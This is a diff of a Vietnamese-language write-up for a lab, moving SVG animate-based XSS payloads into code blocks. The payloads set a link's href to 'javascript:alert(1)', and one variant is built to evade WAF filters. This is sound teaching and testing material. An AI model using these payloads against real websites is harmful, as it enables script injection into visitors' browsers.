@@ -360,13 +360,20 @@ Tiếp tục về Freeze the keyTimes, nếu thuộc tính "fill" được đặ
   
 ```
 Sâu chuỗi lại có thể thực thi xss với ý tưởng như sau: 
-  
-> <svg><animate xlink:href=#xss attributeName=href fill=freeze dur=1ms values="http://isec.pl;javascript:alert(1)" /><a id=xss><text x=20 y=20>XSS</text></a>
+
+``` 
+<svg><animate xlink:href=#xss attributeName=href fill=freeze dur=1ms values="http://isec.pl;javascript:alert(1)" /><a id=xss><text x=20 y=20>XSS</text></a>
+ 
+```
   
 Để đi sâu hơn vào việc đánh lừa waf thì trong blog còn đưa ra thêm 1 số ví dụ khá hay và chi tiết. Còn để khai thác bài lab xss này thì không cần đi sâu hơn nữa,  ta chỉ việc set attributeName và values javascript:alert(1) để khai thác đúng với yêu cầu bài lab là xong: 
   
-> payload: <svg><a><animate attributeName=href values="javascript:alert(1)" /><text x=20 y=20>Click me</text></a>  hoặc <svg><animate xlink:href=#xss attributeName=href values="javascript:alert(1)" /><a id=xss><text x=20 y=20>Click me</text></a>
-  
+```
+payload: <svg><a><animate attributeName=href values="javascript:alert(1)" /><text x=20 y=20>Click me</text></a>  
+or 
+<svg><animate xlink:href=#xss attributeName=href values="javascript:alert(1)" /><a id=xss><text x=20 y=20>Click me</text></a>
+
+```
 ![image](https://github.com/manhhuy2002/Writeup/assets/104350480/a5dca0f9-8254-43b5-8222-13a722e1c468)
  
   
